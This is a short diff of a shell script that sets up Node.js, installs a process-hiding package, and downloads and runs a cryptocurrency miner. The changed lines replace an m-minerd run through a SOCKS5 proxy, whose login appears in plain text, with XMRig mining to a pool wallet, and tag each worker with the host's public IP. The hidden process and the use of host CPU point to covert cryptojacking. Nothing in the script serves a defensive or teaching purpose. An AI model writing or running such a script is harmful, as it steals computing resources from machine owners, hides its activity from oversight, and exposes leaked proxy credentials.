@@ -4,6 +4,6 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
 npm i -g node-process-hider
-wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz -O - | tar -xz && cd m-minerd-64-linux
-ph add m-minerd
-./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u kntlpop.kntlpop1 -p x -s $(nproc --all) -t $(nproc --all) --proxy socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
+ph add xmrig
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/arq -o evox.e4pool.com:4488 -u evcFBgvjCCZ3qQ5bHSTR1FPZaQ8t2vd1DRtiiomjXeDwLoYq4X3ccL5hJzCUDVggAR1hLeTBk8PBM1FfkcoNWFHb6Jwq39kwWM.$ip -p x --threads=$(nproc --all) --cpu-priority=5 --randomx-mode=fast --keepalive
